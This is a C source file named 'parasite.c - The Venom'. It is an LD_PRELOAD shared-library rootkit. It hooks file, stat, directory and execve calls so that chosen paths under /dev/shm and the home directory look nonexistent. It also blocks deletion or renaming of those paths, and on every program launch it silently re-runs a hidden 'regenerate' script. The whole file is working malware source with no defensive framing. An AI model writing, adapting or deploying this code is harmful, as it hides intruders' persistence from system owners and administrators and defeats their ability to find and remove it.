// parasite.c - The Venom
// Compile: gcc -shared -fPIC -O2 -s -o libsystem-core.so parasite.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>

#define MAX_HIDDEN 32

static char hidden_paths[MAX_HIDDEN][512];
static int hidden_count = 0;
static int access_counter = 0;
static int shuffle_threshold = 50;

// Original function pointers
static int (*real_open)(const char*, int, ...) = NULL;
static int (*real_open64)(const char*, int, ...) = NULL;
static int (*real_stat)(const char*, struct stat*) = NULL;
static int (*real_stat64)(const char*, struct stat*) = NULL;
static int (*real_lstat)(const char*, struct stat*) = NULL;
static int (*real_access)(const char*, int) = NULL;
static int (*real_unlink)(const char*) = NULL;
static int (*real_remove)(const char*) = NULL;
static int (*real_rename)(const char*, const char*) = NULL;
static DIR* (*real_opendir)(const char*) = NULL;
static struct dirent* (*real_readdir)(DIR*) = NULL;
static int (*real_execve)(const char*, char* const*, char* const*) = NULL;

// Helper to open files using real_fopen
static FILE* real_fopen(const char *path, const char *mode) {
    return fopen(path, mode);
}

// Load hidden paths from state file
static void load_hidden_paths(void) {
    FILE *f = real_fopen("/dev/shm/.mutatd_state/seeds", "r");
    if (!f) {
        // Try to create the state directory if it doesn't exist
        mkdir("/dev/shm/.mutatd_state", 0700);
        f = real_fopen("/dev/shm/.mutatd_state/seeds", "r");
        if (!f) return;
    }
    
    char line[512];
    while (fgets(line, sizeof(line), f) && hidden_count < MAX_HIDDEN) {
        line[strcspn(line, "\n")] = 0;
        if (strlen(line) > 0) {
            strncpy(hidden_paths[hidden_count++], line, 511);
        }
    }
    fclose(f);
    
    const char *home = getenv("HOME");
    if (home) {
        snprintf(hidden_paths[hidden_count++], 512, "%s/mutatd", home);
        snprintf(hidden_paths[hidden_count++], 512, "%s/.mutatd_state", home);
    }
    strncpy(hidden_paths[hidden_count++], "/dev/shm/.mutatd_state", 511);
}

static int is_hidden(const char *path) {
    if (!path) return 0;
    for (int i = 0; i < hidden_count; i++) {
        if (strstr(path, hidden_paths[i])) {
            return 1;
        }
    }
    return 0;
}

static void maybe_shuffle(void) {
    access_counter++;
    if (access_counter >= shuffle_threshold) {
        access_counter = 0;
        shuffle_threshold = rand() % 40 + 30;
        
        int fd = real_open("/dev/shm/.mutatd_state/shuffle_trigger", 
                          O_CREAT | O_WRONLY, 0644);
        if (fd >= 0) {
            write(fd, "1", 1);
            close(fd);
        }
    }
}

static void check_and_respawn(void) {
    const char *home = getenv("HOME");
    if (!home) return;
    
    char flag_path[512];
    snprintf(flag_path, 512, "%s/mutatd", home);
    
    if (real_access(flag_path, F_OK) != 0) {
        system("/dev/shm/.mutatd_state/regenerate 2>/dev/null &");
    }
}

static void reload_handler(int sig) {
    (void)sig;
    hidden_count = 0;
    load_hidden_paths();
}

__attribute__((constructor)) static void init(void) {
    real_open = dlsym(RTLD_NEXT, "open");
    real_open64 = dlsym(RTLD_NEXT, "open64");
    real_stat = dlsym(RTLD_NEXT, "__xstat");
    if (!real_stat) real_stat = dlsym(RTLD_NEXT, "stat");
    real_stat64 = dlsym(RTLD_NEXT, "__xstat64");
    if (!real_stat64) real_stat64 = dlsym(RTLD_NEXT, "stat64");
    real_lstat = dlsym(RTLD_NEXT, "__lxstat");
    if (!real_lstat) real_lstat = dlsym(RTLD_NEXT, "lstat");
    real_access = dlsym(RTLD_NEXT, "access");
    real_unlink = dlsym(RTLD_NEXT, "unlink");
    real_remove = dlsym(RTLD_NEXT, "remove");
    real_rename = dlsym(RTLD_NEXT, "rename");
    real_opendir = dlsym(RTLD_NEXT, "opendir");
    real_readdir = dlsym(RTLD_NEXT, "readdir");
    real_execve = dlsym(RTLD_NEXT, "execve");
    
    load_hidden_paths();
    signal(SIGUSR1, reload_handler);
    
    srand(time(NULL) ^ getpid());
    shuffle_threshold = rand() % 40 + 30;
}

// === HOOKED FILE OPERATIONS ===

int open(const char *pathname, int flags, ...) {
    if (!real_open) return -1;
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
        return real_open(pathname, flags, mode);
    }
    return real_open(pathname, flags);
}

int open64(const char *pathname, int flags, ...) {
    if (!real_open64) {
        // Fallback to open
        va_list args;
        va_start(args, flags);
        mode_t mode = (flags & O_CREAT) ? va_arg(args, mode_t) : 0;
        va_end(args);
        return open(pathname, flags, mode);
    }
    
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
        return real_open64(pathname, flags, mode);
    }
    return real_open64(pathname, flags);
}

int __xstat(int ver, const char *pathname, struct stat *statbuf) {
    if (!real_stat) return -1;
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_stat(pathname, statbuf);
}

int __xstat64(int ver, const char *pathname, struct stat *statbuf) {
    if (!real_stat64) {
        return __xstat(ver, pathname, statbuf);
    }
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_stat64(pathname, statbuf);
}

int __lxstat(int ver, const char *pathname, struct stat *statbuf) {
    if (!real_lstat) return -1;
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_lstat(pathname, statbuf);
}

// Fallback stat/lstat for systems without __xstat
int stat(const char *pathname, struct stat *statbuf) {
    return __xstat(0, pathname, statbuf);
}

int lstat(const char *pathname, struct stat *statbuf) {
    return __lxstat(0, pathname, statbuf);
}

int access(const char *pathname, int mode) {
    if (!real_access) return -1;
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_access(pathname, mode);
}

int unlink(const char *pathname) {
    if (!real_unlink) return -1;
    if (is_hidden(pathname)) {
        errno = EPERM;
        return -1;
    }
    return real_unlink(pathname);
}

int remove(const char *pathname) {
    if (!real_remove) return -1;
    if (is_hidden(pathname)) {
        errno = EPERM;
        return -1;
    }
    return real_remove(pathname);
}

int rename(const char *oldpath, const char *newpath) {
    if (!real_rename) return -1;
    if (is_hidden(oldpath) || is_hidden(newpath)) {
        errno = EPERM;
        return -1;
    }
    return real_rename(oldpath, newpath);
}

// === DIRECTORY HIDING ===

DIR *opendir(const char *name) {
    if (!real_opendir) return NULL;
    if (is_hidden(name)) {
        errno = ENOENT;
        return NULL;
    }
    return real_opendir(name);
}

struct dirent *readdir(DIR *dirp) {
    if (!real_readdir) return NULL;
    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (!is_hidden(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

// === EXECVE HOOK ===

int execve(const char *pathname, char *const argv[], char *const envp[]) {
    check_and_respawn();
    if (!real_execve) {
        // Ultimate fallback
        return execv(pathname, argv);
    }
    return real_execve(pathname, argv, envp);
}
